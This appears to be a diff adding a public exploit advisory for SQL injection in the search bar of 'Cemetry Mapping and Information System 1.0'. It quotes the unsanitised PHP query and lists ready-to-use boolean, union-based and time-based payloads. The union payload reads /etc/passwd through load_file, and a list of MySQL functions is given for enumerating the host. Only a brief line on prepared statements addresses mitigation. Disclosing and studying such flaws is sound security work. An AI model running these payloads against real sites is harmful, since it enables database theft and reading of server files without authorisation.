@@ -1,0 +1,83 @@
+# Exploit Title: Cemetry Mapping and Information System 1.0 - Multiple SQL Injections
+# Exploit Author: Mesut Cetin
+# Date: 2021-01-12
+# Vendor Homepage: https://www.sourcecodester.com/php/12779/cemetery-mapping-and-information-system-using-phpmysqli.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=12779&title=Cemetery+Mapping+and+Information+System+Using+PHP%2FMySQLi+with+Source+Code
+# Affected Version: 1.0
+# Vulnerable parameter: "Search" bar (POST method)
+# Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0
+
+SQL Injection is a type of an injection attack that makes it possible to execute malicious SQL statements. Due to unsanitized user input, the attacker can retrieve the entire SQL database in this case.
+
+Explanation:
+
+The function "person.php" takes user input through the search bar at line 45:
+
+"$_POST['search']"
+
+and uses it without any sanitization for the following SQL statement (line 46-49):
+
+$sql = "SELECT * FROM tblpeople WHERE FNAME LIKE '%".$search."%'";
+$mydb->setQuery($sql);
+$cur = $mydb->executeQuery();
+$numrows = $mydb->num_rows($cur);//get the number of count
+
+A single quote (') at the search bar under http://localhost/CemeteryMapping/index.php?q=person will result in SQL synthax errors.
+
+Proof of Concept:
+
+Since the php code lacks of sanitization of the user input, multiple SQL injection queries can be found.
+
+1. Boolean-based SQL injection
+
+POST request the page /CemeteryMapping/index.php?q=person and use as payload: ' or 1=1 --
+
+search=' or 1=1 --
+
+2. Union-based SQL injection
+
+To retrieve sensitive files like /etc/passwd, use the following payload at the search bar (POST request http://localhost/CemeteryMapping/index.php?q=person):
+
+search=' UNION SELECT NULL,load_file('/etc/passwd'),NULL,NULL,NULL,NULL,NULL-- -
+
+If you want to enumerate the target system further, replace "load_file('/etc/passwd')" with one of the following MySQL commands:
+
+@@hostname : Current Hostname
+
+@@tmpdir : Temp Directory
+
+@@datadir : Data Directory
+
+@@version : Version of DB
+
+@@basedir : Base Directory
+
+user() : Current User
+
+database() : Current Database
+
+version() : Version
+
+schema() : current Database
+
+UUID() : System UUID key
+
+current_user() : Current User
+
+current_user : Current User
+
+system_user() : Current System user
+
+session_user() : Session user
+
+@@GLOBAL.have_symlink : Check if Symlink is enabled or disabled
+
+@@GLOBAL.have_ssl : Check if it have SSL or not
+
+3. Time-based SQL injection
+
+For time-based SQL injection, use the payload: ' AND (SELECT 2634 FROM (SELECT(SLEEP(5)))muaN)-- -
+
+Mitigation:
+
+By using prepared statements and parameterized queries, the SQL injection can be prevented.
